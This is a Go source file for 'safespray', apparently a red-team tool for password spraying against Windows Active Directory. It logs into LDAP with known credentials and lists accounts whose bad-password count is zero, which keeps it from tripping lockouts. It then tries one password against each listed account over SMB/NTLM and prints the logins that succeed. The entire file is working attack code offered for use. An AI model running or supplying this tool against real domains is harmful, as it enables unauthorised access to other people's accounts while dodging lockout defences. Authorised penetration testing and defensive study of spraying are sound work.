package main
/*
author: deadjakk
sort of threw this together so main is a monster function and there are no colors but it works

basically this performs an unencrypted ldap query against the provided dcip or domain
and performs password spraying on any accounts that meet the following criteria:
1. has a badpwdcount equal to 0
2. has a username that is present in the provided userlist flag
3. does not end in $ (computer accounts usually though this should not ever be hit since it only queries user objects)
4. is not an account in ignoreArray (see isIgnorable function)

*/

import (
    "fmt"
    "os"
    "flag"
    "bufio"
    "strings"
    "net"

    "github.com/go-ldap/ldap/v3"
    "github.com/hirochachacha/go-smb2"
)

const USAGE = "Usage: safespray <dcip> <domain> <known-username> <known-password> <user list> <password to spray>"
const BADPWDZERO_QUERY = "(&(objectClass=user)(badPwdCount=0))"

func isIgnorable (username string) bool {
    ignoreArray := [...]string{"Guest", "krbtgt"} // NOTE: add any other accounts or logic you wish to avoid here
    for _, ignoreV := range ignoreArray {
        if strings.ToLower(username) == strings.ToLower(ignoreV) {
            return true
        }
        if strings.HasSuffix(username, "$"){
            return true
        }
    }
    return false
}

// domainToDN converts a domain name to a DN format for LDAP.
func domainToDN(domain string) string {
    parts := strings.Split(domain, ".")
    ldapParts := make([]string, len(parts))
    for i, part := range parts {
        ldapParts[i] = fmt.Sprintf("dc=%s", part)
    }
    return strings.Join(ldapParts, ",")
}

// attemptLogin tries to log into the SMB server.
func attemptLogin(username, sprayPassword, domain string) bool {
    conn, err := net.Dial("tcp", fmt.Sprintf("%s:445", domain))
    if err != nil {
        fmt.Println("Failed to connect to SMB:", err)
        return false
    }
    defer conn.Close()
    d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     username,
			Password: sprayPassword,
		},
	}
    s, err := d.Dial(conn)
    if err != nil {
        return false
    }
    defer s.Logoff()

    return true // Here, you might want to implement a more detailed check
}

func inArr(val string, array []string) bool {
    for _, value := range array {
        if strings.ToLower(value) == strings.ToLower(val) {
            return true
        }
    }
    return false
}

func main() {
    dcIP := flag.String("dcip", "", "(optional) ip of the domain controller, optional, if excluded domain will be used as target instead")
    domain := flag.String("domain", "", "target domain name to authenticate and spray against")
    authdomain := flag.String("authdomain", "", "(optional) valid domain to query ldap (if different from target domain)")
    username := flag.String("username", "", "valid username to query ldap")
    password := flag.String("password", "", "valid password to query ldap")
    userList := flag.String("userlist", "", "path to the user file")
    sprayPassword := flag.String("spraypassword", "", "password to spray")
    verbose := flag.Bool("verbose", false, "(optional) enable verbose output")
    flag.Parse()
       // Validate required flags
    if *domain == "" || *username == "" || *password == "" || *userList == "" || *sprayPassword == "" {
        fmt.Println("Error: All required flags must be provided.")
        flag.Usage() // Display the usage information
        return
    }


    fh, err := os.Open(*userList)
    if err != nil {
        fmt.Println("could not open file:", err)
        return
    }
    defer fh.Close()
    var loadedUsers []string
    scanner := bufio.NewScanner(fh)
    for scanner.Scan(){
        line := strings.TrimSpace(scanner.Text())
        if line != "" {
            loadedUsers = append(loadedUsers , line)
        }
    }
        // Check for errors during scanning
    if err := scanner.Err(); err != nil {
        fmt.Println("file scanner err:", err)
        return
    }

    if *dcIP == "" {
        *dcIP = *domain
    }
    ldapURL := fmt.Sprintf("ldap://%s/", *dcIP)
    domainDN := domainToDN(*domain)

    // Connect to LDAP
    ldapConn, err := ldap.DialURL(ldapURL)
    if err != nil {
        fmt.Println("ldap connection failed:", err)
        return
    }
    defer ldapConn.Close()

    if *authdomain == "" {
        *authdomain = *domain
    }
    // Bind to LDAP
    bindDN := fmt.Sprintf("%s@%s", *username, *authdomain)
    err = ldapConn.Bind(bindDN, *password)
    if err != nil {
        fmt.Println("ldap bind failed:", err)
        return
    }

    // Search for all users
    searchRequest := ldap.NewSearchRequest(
        domainDN,
        ldap.ScopeWholeSubtree, //scope
        ldap.NeverDerefAliases, // deref aliases
        0, // sizelimit
        0, // timelimit
        false, // types only
        BADPWDZERO_QUERY,
        []string{"sAMAccountName", "badPwdCount"},
        nil,
    )

    sr, err := ldapConn.Search(searchRequest)
    if err != nil {
        fmt.Println("Failed to search LDAP:", err)
        return
    }

    samAccounts := make([]string, 0)
    for _, entry := range sr.Entries {
        samAccount := entry.GetAttributeValues("sAMAccountName")[0]
        if len(samAccount) <= 0 {
            continue
        }
        if inArr(samAccount, loadedUsers) && isIgnorable(samAccount) == false { 
            samAccounts = append(samAccounts, samAccount)
        } else {
            fmt.Println(fmt.Sprintf("SKIPPED account: %s", samAccount))
        }
    }
    fmt.Println(fmt.Sprintf("laoded %d users", len(samAccounts)))

    for _, samAccount := range samAccounts {
        if attemptLogin(samAccount, *sprayPassword, *domain) {
            fmt.Printf("SUCCESS - %s@%s with password %s\n", samAccount, *domain, *sprayPassword)
        } else {
            if *verbose {
                fmt.Printf("FAILED - %s@%s with password %s\n", samAccount, *domain, *sprayPassword)
            }
        }
    }
}

